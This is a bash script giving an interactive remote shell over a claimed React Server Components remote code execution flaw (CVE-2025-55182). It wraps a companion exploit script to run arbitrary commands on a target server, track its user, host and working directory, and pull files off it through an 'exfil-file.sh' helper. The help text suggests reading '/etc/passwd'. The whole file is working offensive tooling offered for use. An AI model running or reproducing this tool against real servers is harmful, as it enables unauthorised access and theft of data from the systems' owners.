#!/bin/bash
#
# shell.sh - Interactive shell for CVE-2025-55182
#
# Provides a pseudo-interactive shell experience over the RCE vulnerability.
# Each command is executed via exploit-redirect.sh with output displayed.
#
# Usage: ./shell.sh <target_url>
#
# Example:
#   ./shell.sh http://localhost:3443
#

set -e

# Configuration
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXPLOIT_SCRIPT="$SCRIPT_DIR/exploit-redirect.sh"
HISTORY_FILE="$HOME/.react2shell_history"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# State
TARGET=""
CWD="/"
HOSTNAME=""
USER=""

usage() {
    echo "Usage: $0 <target_url>"
    echo ""
    echo "Interactive shell over CVE-2025-55182 RCE"
    echo ""
    echo "Example:"
    echo "  $0 http://localhost:3443"
    echo ""
    echo "Built-in commands:"
    echo "  exit, quit    - Exit the shell"
    echo "  help          - Show this help"
    echo "  cd <dir>      - Change directory (tracked locally)"
    echo "  download <f>  - Download file using exfil-file.sh"
    echo "  !<cmd>        - Run local command"
    echo ""
    exit 1
}

log_error() {
    echo -e "${RED}[-]${NC} $1" >&2
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1" >&2
}

log_info() {
    echo -e "${BLUE}[*]${NC} $1" >&2
}

# Check dependencies
check_deps() {
    if [[ ! -x "$EXPLOIT_SCRIPT" ]]; then
        log_error "exploit-redirect.sh not found at: $EXPLOIT_SCRIPT"
        exit 1
    fi
}

# Execute command on target
exec_remote() {
    local cmd="$1"

    # Prepend cd to maintain working directory
    if [[ "$CWD" != "/" ]]; then
        cmd="cd $CWD && $cmd"
    fi

    "$EXPLOIT_SCRIPT" -q "$TARGET" "$cmd" 2>/dev/null
}

# Get initial target info
init_target_info() {
    log_info "Connecting to $TARGET..."

    # Get hostname (avoid single quotes in command)
    HOSTNAME=$(exec_remote "hostname 2>/dev/null || echo unknown")
    HOSTNAME=$(echo "$HOSTNAME" | tr -d '\n\r')

    # Get user
    USER=$(exec_remote "whoami 2>/dev/null || echo unknown")
    USER=$(echo "$USER" | tr -d '\n\r')

    # Get initial working directory
    CWD=$(exec_remote "pwd")
    CWD=$(echo "$CWD" | tr -d '\n\r')

    if [[ -z "$CWD" ]]; then
        CWD="/"
    fi

    echo ""
    echo -e "${GREEN}Connected!${NC}"
    echo -e "  User: ${CYAN}$USER${NC}"
    echo -e "  Host: ${CYAN}$HOSTNAME${NC}"
    echo -e "  CWD:  ${CYAN}$CWD${NC}"
    echo ""
    echo -e "${YELLOW}Type 'help' for available commands. Each command is a new HTTP request.${NC}"
    echo ""
}

# Build the prompt
get_prompt() {
    # Shorten CWD for display
    local display_cwd="$CWD"
    if [[ ${#CWD} -gt 40 ]]; then
        display_cwd="...${CWD: -37}"
    fi

    echo -e "${GREEN}${USER}@${HOSTNAME}${NC}:${BLUE}${display_cwd}${NC}\$ "
}

# Handle cd command
handle_cd() {
    local dir="$1"

    if [[ -z "$dir" ]]; then
        dir="~"
    fi

    # Resolve the directory on the target
    local new_cwd
    if [[ "$dir" == "~" ]] || [[ "$dir" == "~/"* ]]; then
        # Handle home directory
        new_cwd=$(exec_remote "cd $dir && pwd")
    elif [[ "$dir" == "/"* ]]; then
        # Absolute path
        new_cwd=$(exec_remote "cd '$dir' && pwd")
    else
        # Relative path
        new_cwd=$(exec_remote "cd '$dir' && pwd")
    fi

    new_cwd=$(echo "$new_cwd" | tr -d '\n\r')

    if [[ -n "$new_cwd" ]]; then
        CWD="$new_cwd"
    else
        log_error "cd: no such directory: $dir"
    fi
}

# Handle download command
handle_download() {
    local remote_file="$1"
    local local_file="$2"

    if [[ -z "$remote_file" ]]; then
        log_error "Usage: download <remote_file> [local_file]"
        return
    fi

    # Default local filename
    if [[ -z "$local_file" ]]; then
        local_file=$(basename "$remote_file")
    fi

    # Resolve path if relative
    local full_path="$remote_file"
    if [[ "$remote_file" != "/"* ]]; then
        full_path="$CWD/$remote_file"
    fi

    log_info "Downloading: $full_path -> $local_file"

    if [[ -x "$SCRIPT_DIR/exfil-file.sh" ]]; then
        "$SCRIPT_DIR/exfil-file.sh" "$TARGET" "$full_path" "$local_file"
    else
        # Fallback to simple cat
        local content
        content=$(exec_remote "cat '$full_path'")
        if [[ -n "$content" ]]; then
            echo -n "$content" > "$local_file"
            echo -e "${GREEN}[+]${NC} Saved to: $local_file"
        else
            log_error "Failed to download file"
        fi
    fi
}

# Show help
show_help() {
    echo ""
    echo -e "${BOLD}CVE-2025-55182 Interactive Shell${NC}"
    echo ""
    echo "Built-in commands:"
    echo "  help              Show this help"
    echo "  exit, quit, q     Exit the shell"
    echo "  cd <dir>          Change directory (state tracked between commands)"
    echo "  download <f> [o]  Download remote file to local path"
    echo "  !<cmd>            Run command locally (not on target)"
    echo ""
    echo "Tips:"
    echo "  - Each command is a separate HTTP request"
    echo "  - Use 'cd' to navigate; path is prepended to subsequent commands"
    echo "  - For large output, pipe to head/tail: ls -la /usr | head -20"
    echo "  - Binary files: use 'download' or base64 encode"
    echo ""
    echo "Examples:"
    echo "  id                    # Show user info"
    echo "  cat /etc/passwd       # Read file"
    echo "  ls -la                # List current directory"
    echo "  cd /var/log           # Change to logs directory"
    echo "  download access.log   # Download file"
    echo "  !ls                   # Run 'ls' locally"
    echo ""
}

# Main REPL loop
repl() {
    # Enable readline history if in a terminal
    if [[ -t 0 ]] && [[ -f "$HISTORY_FILE" ]]; then
        history -r "$HISTORY_FILE"
    fi

    while true; do
        # Get prompt
        local prompt
        prompt=$(get_prompt)

        # Read input - use readline if in terminal, simple read otherwise
        local cmd
        if [[ -t 0 ]]; then
            if ! read -e -p "$prompt" cmd; then
                echo ""
                echo "Goodbye!"
                break
            fi
        else
            echo -n "$prompt"
            if ! read cmd; then
                echo ""
                echo "Goodbye!"
                break
            fi
        fi

        # Skip empty commands
        if [[ -z "$cmd" ]]; then
            continue
        fi

        # Add to history
        history -s "$cmd"

        # Parse command
        case "$cmd" in
            exit|quit|q)
                echo "Goodbye!"
                break
                ;;
            help)
                show_help
                ;;
            cd)
                handle_cd ""
                ;;
            cd\ *)
                handle_cd "${cmd#cd }"
                ;;
            download\ *)
                local args="${cmd#download }"
                # shellcheck disable=SC2086
                handle_download $args
                ;;
            \!*)
                # Local command
                local local_cmd="${cmd#!}"
                eval "$local_cmd"
                ;;
            *)
                # Remote command
                local output
                output=$(exec_remote "$cmd")
                if [[ -n "$output" ]]; then
                    echo "$output"
                fi
                ;;
        esac
    done

    # Save history
    history -w "$HISTORY_FILE"
}

# Entry point
main() {
    if [[ $# -lt 1 ]]; then
        usage
    fi

    TARGET="$1"

    check_deps

    echo ""
    echo -e "${BOLD}${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${RED}║${NC}  ${BOLD}CVE-2025-55182 Interactive Shell${NC}                        ${BOLD}${RED}║${NC}"
    echo -e "${BOLD}${RED}║${NC}  React Server Components RCE                              ${BOLD}${RED}║${NC}"
    echo -e "${BOLD}${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    init_target_info
    repl
}

main "$@"
